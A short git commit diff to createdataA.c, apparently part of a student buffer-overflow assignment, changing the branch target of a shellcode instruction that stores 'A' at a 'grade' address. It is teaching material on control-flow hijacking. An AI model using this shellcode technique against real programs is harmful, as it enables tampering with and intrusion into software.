0b4ff586a5c820654836ab78238d9bdbbcf0448d
Kevvy <25ktran8@gmail.com>
2026-04-29 18:03:18 -0400

    instruction 4 change

--- createdataA.c
+++ createdataA.c
@@ -36,8 +36,8 @@ int main(void) {
     /* instruction 3: strb w1, [x0] (store 'A' at grade) */
     instr3 = MiniAssembler_strb(1, 0);
     
-    /* instruction 4: b 0x40089c (branch back to main+64) */
-    instr4 = MiniAssembler_b(0x40089c, 0x42006a);
+    /* Instruction 4: b 0x4008a0 (branch to grade loading instead) */
+    instr4 = MiniAssembler_b(0x4008a0, 0x42006a);
     
     /* write shellcode bytes (instructions 1-4, 16 bytes total) */
     bytes = (unsigned char *)&instr1;
